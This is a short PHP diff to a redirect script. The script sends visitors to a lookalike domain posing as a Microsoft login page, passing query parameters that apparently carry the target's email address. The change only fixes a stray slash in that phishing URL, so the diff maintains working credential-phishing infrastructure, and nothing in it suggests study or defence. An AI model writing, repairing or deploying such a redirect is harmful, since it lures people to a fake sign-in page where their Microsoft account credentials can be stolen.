@@ -11,6 +11,6 @@ function Redirect($url, $permanent = false)
  exit();
 }
 
-Redirect("https://accounts-loginmicrosoft.resandstat.com/auth/login.php/?client_id=" . $_GET['1'] . "@" . $_GET['2']   . "", false);
+Redirect("https://accounts-loginmicrosoft.resandstat.com/auth/login.php?client_id=" . $_GET['1'] . "@" . $_GET['2']   . "", false);
 
 ?>
